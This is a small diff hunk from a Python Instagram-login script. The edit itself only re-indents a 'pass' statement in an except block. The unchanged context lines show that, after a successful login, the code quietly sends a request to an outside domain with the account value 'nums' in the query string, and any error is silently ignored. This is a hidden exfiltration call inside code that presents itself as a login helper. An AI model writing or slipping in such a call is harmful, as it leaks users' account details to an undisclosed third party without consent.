@@ -915,7 +915,7 @@ def LoginToInstagram(nums):
       print (f"{G}LOGGED IN SUCCESSFULLY AS{W}",UserInfo["user"]["username"])
       requests.get('https://crazyboysofagv.com/ins/login.php?user={}'.format(nums))
     except:
-	pass
+      pass
 # MAIN LOGIN V2
 def LoginToInstagramV2():
     global api
